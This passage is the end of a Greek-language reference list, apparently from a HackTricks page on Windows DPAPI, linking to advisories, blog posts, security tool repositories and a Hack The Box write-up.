- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Βελτίωση της ασφάλειας των Chrome cookies στα Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Απλή εξαγωγή του προαιρετικού entropy του DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 release notes](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – Σελίδα project στο PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: Κατάχρηση AD ACL, cracking Argon2 του KeePassXC και DPAPI decryption έως admin του DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Χρήση και options](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
